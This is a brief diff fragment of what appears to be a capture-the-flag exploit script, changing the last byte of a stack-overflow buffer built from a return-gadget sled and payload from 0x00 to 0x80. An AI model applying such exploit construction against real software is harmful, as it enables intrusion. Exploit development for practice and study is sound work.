@@ -277,7 +277,7 @@ def solve():
 
     print(len(payload))
 
-    exploit = ret * ((256 - len(payload))//8) + payload + p8(0x00)
+    exploit = ret * ((256 - len(payload))//8) + payload + p8(0x80)
     # print(len(exploit))
     # exploit = b'A'*267
 
